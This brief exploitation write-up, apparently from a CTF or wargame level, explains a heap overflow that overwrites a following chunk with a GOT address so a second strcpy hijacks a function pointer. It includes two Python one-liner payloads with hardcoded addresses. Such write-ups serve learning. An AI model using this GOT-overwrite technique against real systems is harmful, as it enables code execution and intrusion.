We provoke an overflow into the first chunck to overwrite the following one with a GOT address.
Then the 2nd strcpy will write inside the GOT address the value of the second argument.
Our crafted GOT address is then called at the end of the function.


Our 2 payloads are built as like :
- python -c 'print "A"*20 + "\x28\x99\x04\x08"' > /tmp/payload
- python -c 'print "\xf4\x84\x04\x08"' > /tmp/payload
